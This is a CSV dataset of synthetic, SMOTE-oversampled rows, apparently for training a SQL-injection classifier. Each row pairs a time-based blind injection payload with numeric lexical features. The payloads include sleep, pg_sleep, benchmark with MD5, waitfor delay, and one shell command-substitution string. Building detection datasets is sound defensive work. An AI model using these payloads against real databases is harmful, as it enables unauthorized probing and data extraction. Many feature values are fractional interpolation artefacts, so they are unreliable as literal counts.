id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000250,attack,time,1  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000088,1.018474796211186,28.52596800695526,13.0,2.9193672526063397,9.75432800115921,1.5086560023184195,12.52596800695526,4.737015996522371,0.34356966661836624,0.050288533410613984,0.4339104001545613,0.17223139981645846,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7543280011592097,0.0,0.9826879953631609,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000251,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,0.3286072536743465,54.373014828349746,20.87460296566995,3.2377310830133874,13.0,10.125397034330051,23.498411862679795,7.7492059313398975,0.239327566265983,0.18660606858351103,0.43180374420617995,0.14226262094432596,0.0,0.8746029656699489,0.0,0.0,0.0,0.0,0.0,4.874602965669949,0.0,0.0,1.0,0.0,0.0,0.8746029656699489,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000252,attack,time,select sleep  (  5  )   and   (  'dcys' like 'dcys,nearest_attack_euclidean,R000135,2.73125020816226,47.518093071852434,16.503618614370488,3.398686830461559,24.51085584311146,1.4963813856295127,15.510855843111461,6.0,0.5155877210166265,0.03213376720427699,0.32566009330403634,0.12661841847506017,1.510855843111461,1.9855255425180522,0.0,0.0,0.0,0.0,0.0,2.503618614370487,0.0,0.0,0.0,0.0,0.5036186143704869,0.49638138562951295,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.5036186143704869,0.0,0.0,0.0,1.4963813856295132,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000253,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.28449594792789873,34.178998686247176,16.869000145972535,3.4476096728771317,13.0,0.869000145972536,11.047998832219712,9.261999708054928,0.3828809647033093,0.026333337756743513,0.319476172150634,0.27130952538931313,0.0,0.0,2.0,0.0,0.0,0.0,0.0,2.261999708054928,0.0,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000254,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,0.830241325286538,19.95998847258266,11.069084621408718,2.834777654637226,6.247265391643509,2.0,8.53454231070436,3.1781807702347873,0.3020130932694825,0.10360157673339979,0.4328388004061633,0.1615465295909544,0.0,0.0,0.35636154046957347,0.0,0.0,0.0,0.0,1.9999999999999996,0.0,0.0,0.0,0.35636154046957347,0.0,0.0,0.17818077023478673,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.17818077023478668,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1781807702347868
SMOTE_000255,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000100,0.213035905075319,78.52131886620545,19.043490621582194,2.7348444459490144,21.0,2.0,42.782262595698604,12.739056270506843,0.27093812603524065,0.0258036310509753,0.5412073308540349,0.1620509120597491,0.0,4.0,0.0,0.0,0.0,1.0,0.0,7.739056270506843,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000256,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,1.445265489259452,68.69277682217134,22.538729612669336,3.3890550957682066,19.07658798416333,13.077459225338673,28.769364806334668,7.769364806334668,0.2800968230986263,0.18808313421557474,0.4191324877952035,0.11268755489059543,1.0,0.0,0.0,0.0,0.0,1.3846824031673344,0.0,4.0,0.0,0.0,0.38468240316733426,1.3846824031673344,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.38468240316733426,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3846824031673344
SMOTE_000257,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.6134556190547427,37.43805104869674,23.0,4.192365148359526,16.0,2.0,7.031709207247289,12.406341841449457,0.4299590126974579,0.053744876587182244,0.18391607457154796,0.33238003614381195,2.0,0.0,2.0,0.0,0.0,0.0,0.0,1.406341841449457,0.0,4.0,1.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000258,attack,time,1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000058,0.9091005625073227,111.5021278714083,28.874468032147924,3.367024349159869,36.125531967852076,10.0,52.001418580938875,13.375177322617358,0.3241857727998807,0.0899221488483403,0.4658405342387067,0.12005154411307228,1.0,0.0,0.0,0.0,1.0,1.0,0.0,9.375177322617358,0.0,0.0,0.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,1.0,1.0,0.0,0.3751773226173588,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.375177322617359
SMOTE_000259,attack,time,1%'   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000113,0.4091668003463137,38.31081424822236,14.412645401468277,2.6048401294756793,7.247587240880966,2.660232642349243,21.15540712411118,7.247587240880966,0.19129229207211734,0.06386577544623614,0.5535496404095293,0.19129229207211734,1.0,0.0,0.0,0.0,0.0,0.08252908029365535,0.0,4.165058160587311,0.9174709197063444,0.0,0.08252908029365547,0.08252908029365535,1.0,0.0,0.0,1.0,0.0,0.08252908029365547,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000260,attack,time,1   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000048,0.41078363637674215,34.22587117546485,12.22587117546485,2.3729894266243603,7.0,2.0,20.0,5.2258711754648495,0.20459060602266832,0.05845445886361953,0.5845445886361953,0.15241034647751686,0.11293558773242474,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.1129355877324248,0.0,0.0,0.0,0.11293558773242496,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000261,attack,time,"1"" rlike sleep  (  5  )   and ""veub""  =  ""veub",nearest_attack_euclidean,R000143,1.4173412985128446,45.576359666647804,18.3054386665912,3.474326650787625,21.8472806667044,2.0,15.152719333295602,6.576359666647801,0.4796479988738157,0.043887575201306483,0.332272142350354,0.1441922835745238,0.0,4.0,0.0,0.0,0.0,0.5763596666478005,0.0,1.9999999999999996,0.0,0.0,0.0,0.5763596666478006,0.0,1.0,0.0,0.0,0.0,0.5763596666478006,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.4236403333521994,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4236403333521994
SMOTE_000262,attack,time,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000045,0.011528596069823848,88.01256016043969,27.00209336007328,3.842936654706643,20.99790663992672,29.0,30.008373440293127,8.006280080219843,0.23858220756096687,0.329501421100973,0.3409526182220266,0.09096375311603347,0.0,0.002093360073281425,0.004186720146562739,0.0,0.0,2.0,0.0,4.002093360073282,0.0,0.0,1.0,2.004186720146562,0.0,0.0020933600732812585,0.0020933600732813695,0.9979066399267187,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.9979066399267186,0.0020933600732812585,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000263,attack,time,"1""  )   as rnjx where 2679  =  2679 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000081,2.4631227299978984,102.47681743723979,30.52318256276021,3.9378342984764583,26.52318256276021,29.47681743723979,36.0,10.476817437239792,0.2588511850938575,0.28762684874533645,0.3513073074680533,0.10221465869275279,0.4768174372397921,0.5231825627602079,0.9536348744795843,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,2.953634874479584,0.47681743723979214,0.5231825627602079,0.47681743723979214,0.5231825627602079,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000264,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,0.5799739297746865,24.83939252183761,13.0,3.122129182098903,9.139898753639603,0.27979750727920205,8.83939252183761,6.580303739081197,0.3691708852650166,0.009326583575973421,0.35198650048528013,0.2695160306737298,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1398987536396006,0.0,3.440404985441595,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000265,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000110,1.7971139701069023,79.1393895352293,25.562829457272187,3.5210975332502668,16.609292635681953,19.781414728636094,32.53009689954735,10.218585271363906,0.2111630675519442,0.25340703374196827,0.4063464595164389,0.1290834391896487,0.0,1.0,0.0,0.0,0.0,1.0,0.0,5.827877907045861,0.39070736431804637,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.3907073643180464,0.6092926356819536,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000266,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,0.04249758620563367,55.284943013788734,21.028494301378874,3.228492081449924,13.037992401838496,10.085482904136619,24.13297340643474,8.028494301378874,0.23601825089237727,0.18221435927050839,0.43646522032577134,0.14530216951134292,0.0,1.0,0.0,0.0,0.0,0.009498100459624292,0.0,5.018996200919249,0.0,0.0,1.0,0.009498100459624625,0.0,1.0,0.0,1.0,0.0,0.009498100459624403,1.0,0.0,0.0,0.009498100459624403,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000267,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.012178491748016418,37.94488571141351,17.0,3.331103074395991,13.0,0.0,13.955908569130816,10.988977142282703,0.34267662340639893,-1.3877787807814457e-17,0.3677002597026967,0.28962311689090436,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.9889771422827036,0.0,5.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000268,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,1.2249868494504714,52.384522022950264,20.476904404590055,3.269209653920565,13.0,10.523095595409947,21.907617618360213,6.9538088091801065,0.248727714073326,0.20179092273383434,0.4173419783487292,0.13213938484411045,0.0,0.4769044045900533,0.0,0.0,0.0,0.0,0.0,4.476904404590053,0.0,0.0,1.0,0.0,0.0,0.47690440459005334,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000269,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,0.1920694184722832,69.88621708818829,20.0,2.9735163174823582,21.056891455905852,2.0,35.886217088188296,10.943108544094146,0.3013386224919024,0.02861923651756794,0.5134729792013449,0.15656916178918467,4.0,0.0,0.0,0.0,0.0,0.9431085440941468,0.0,6.0,0.0,0.0,0.0,0.9431085440941468,1.0,0.0,0.0,0.0,0.0,0.9431085440941467,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,1.0,0.056891455905853205,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0568914559058533
SMOTE_000270,attack,time,"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""epfg"" like ""epfg",nearest_attack_euclidean,R000128,2.6277127703516867,116.97705717766384,21.944600006247356,2.826328835970316,35.45271429910148,2.0,63.14325715892177,16.38108571964059,0.3006777152095614,0.0175998339076726,0.5420915475005015,0.13963090338226442,0.0,2.254057146427061,0.0,0.0,1.0,0.0,0.0,12.690542859820296,0.0,0.0,0.0,1.0,0.0,0.5635142866067651,0.0,0.43648571339323483,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,0.5635142866067652,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.563514286606765
SMOTE_000271,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000138,0.9674292841242438,87.6153325667739,27.47693348664522,3.60726614979229,24.907733946580883,15.0,35.661465593483456,12.046133026709558,0.2870199175217333,0.17163472381922104,0.40451860184851796,0.13682675681052772,3.0,0.0,0.0,0.0,0.0,1.0,0.0,6.28459977003217,0.7615332566773898,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000272,attack,time,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",nearest_attack_euclidean,R000095,0.7839490972737023,74.0712602340048,20.4643698829976,3.3475999168177633,20.571653021326938,11.428346978673064,31.428346978673066,10.642913255331734,0.27920286898019087,0.15320907353963684,0.4234665376145291,0.1441215198656431,3.285826510663468,0.0,0.0,0.0,0.0,2.0,0.0,4.3570867446682655,0.0,0.0,1.0,2.0,0.821456627665867,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000273,attack,time,waitfor delay '0:0:5' and 'dfzn'  =  'dfzn,nearest_attack_euclidean,R000144,2.299963073280929,35.133815358472496,18.084508714463,3.8856042361417193,18.422543572315,3.4577456427685007,5.7112717861575,7.5422543572315,0.5173448648962632,0.10654662338700131,0.1541471712088492,0.22196134050788624,4.084508714463,0.0,0.9154912855370001,0.0,0.0,0.5422543572315,0.0,0.0,0.0,0.0,0.0,1.4577456427685,1.0,0.0,0.45774564276850005,0.0,0.0,0.5422543572315001,1.1102230246251565e-16,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.5422543572315,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5422543572314997
SMOTE_000274,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'nbzf' like 'nbzf,nearest_attack_euclidean,R000097,1.3931874268389688,103.1542261570159,24.0,3.230356783987296,40.0,1.0,48.46185513084658,13.692371026169315,0.3880549258027286,0.00970137314506822,0.4695318403932752,0.13271186065892793,2.077113078507948,0.9228869214920523,0.0,0.0,1.0,0.0,0.0,9.692371026169315,0.0,0.0,0.0,1.0,0.6923710261693159,0.3076289738306841,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000275,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,0.2370923250450919,104.13159187583784,29.13159187583784,3.5815439254637984,30.06579593791892,18.0,45.0,11.06579593791892,0.2887241492442337,0.17286205970926333,0.43215514927315835,0.10625864177334465,0.0,0.06579593791892058,2.0,0.0,0.0,2.0,0.0,6.0,0.0,1.0,0.0,4.0,0.0,0.06579593791892041,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,1.0,1.0,0.06579593791892047,0.9342040620810794,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000276,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,0.14548530283298547,66.27106400474281,21.154893716995893,3.3022130764500046,20.806382853755135,10.309787433991783,28.077446858497947,7.077446858497946,0.314348054015824,0.155196208093821,0.4237280407903831,0.10672769709997193,1.0,0.0,0.0,0.0,0.0,1.0387234292489729,0.0,4.0,0.0,0.0,0.03872342924897304,1.0387234292489729,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.038723429248972985,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.038723429248973
SMOTE_000277,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,1.5496536314927327,74.83165758689023,23.651667492100888,3.329949467167464,19.0,10.0,34.48332507899112,11.348332507899112,0.2551010831070226,0.13426372795106453,0.4586971307823381,0.15193805815957478,0.3483325078991121,0.6516674921008879,2.0,0.0,0.0,1.0,0.0,5.696665015798224,0.6516674921008879,1.0,0.0,3.0,0.348332507899112,0.6516674921008878,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000278,attack,time,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  ',nearest_attack_euclidean,R000085,0.20277249397103655,93.55780410334123,22.90524373643026,3.199074302070826,30.87365831524035,2.0,44.81048747286052,15.87365831524035,0.3300308450038583,0.021394201036345414,0.4790006167285285,0.16957433723126772,3.9052437364302626,0.0,0.0,0.0,1.0,0.9684145788100875,0.0,8.0,1.9684145788100877,0.0,0.0,1.9684145788100875,1.0,0.0,0.0,0.03158542118991248,0.0,0.9684145788100875,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,1.936829157620175,0.03158542118991248,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.968414578810088
SMOTE_000279,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.9009114957751112,37.0407283755164,15.29153262507377,3.1607727852337475,12.291532625073772,0.0,14.457663125368862,10.291532625073772,0.33904328347906904,-1.3877787807814457e-17,0.377966616076698,0.282990100444233,0.0,0.0,2.0,0.0,0.0,0.0,0.0,3.2915326250737724,0.0,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.6457663125368861,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6457663125368862
SMOTE_000280,attack,time,1  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000088,0.029861616563705888,30.03832795877201,12.990418010306998,2.833582802746135,9.971254030920997,2.0,14.057491938158014,4.009581989693001,0.3321120993528527,0.0665915138063294,0.46783153600189437,0.13346485083892357,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.009581989693002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.009581989693001947,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.009581989693002
